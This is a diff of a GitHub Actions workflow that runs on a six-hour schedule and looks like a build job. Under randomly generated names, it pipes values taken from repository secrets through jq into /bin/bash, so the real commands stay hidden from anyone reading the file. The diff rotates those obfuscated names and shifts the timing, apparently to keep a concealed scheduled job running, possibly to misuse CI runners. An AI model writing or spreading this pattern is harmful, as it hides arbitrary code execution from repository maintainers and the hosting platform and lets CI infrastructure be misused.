@@ -1,26 +1,25 @@
 name: zhaonaiji1029
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 2/6 * * *'
-
-jobs:  # 17886
+    - cron: '13 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhaonaiji1029
         env:
-          apwdt2: ${{ secrets.apwdt2 }}
+          ssuoi656: ${{ secrets.ssuoi656 }}
         run: |
-          echo $apwdt2 | jq -r .odev4 | /bin/bash
-          echo $aio39514 | jq -r .fijfp367 | /bin/bash
-          echo $mp144 | jq -r .fk3286 | /bin/bash
-          echo $p4 | jq -r .huypw65844 | /bin/bash
-          echo $po18 | jq -r .scld2 | /bin/bash
-          echo $fjy7615 | jq -r .vgbmg54 | /bin/bash
-          echo $i74797 | jq -r .zuoot3 | /bin/bash
-          echo $q657 | jq -r .i63479 | /bin/bash
-          echo $gy242 | jq -r .gs52034 | /bin/bash
-          echo $i87 | jq -r .l1 | /bin/bash
+          echo $ssuoi656 | jq -r .gcjzb944 | /bin/bash
+          echo $xlrn101 | jq -r .gw101 | /bin/bash
+          echo $lcd8 | jq -r .bn594 | /bin/bash
+          echo $b19 | jq -r .mzlmu3598 | /bin/bash
+          echo $r4 | jq -r .nh0 | /bin/bash
+          echo $udx255 | jq -r .frpmf5579 | /bin/bash
+          echo $fmq57 | jq -r .vldm719 | /bin/bash
+          echo $ku4215 | jq -r .ssmj0 | /bin/bash
 
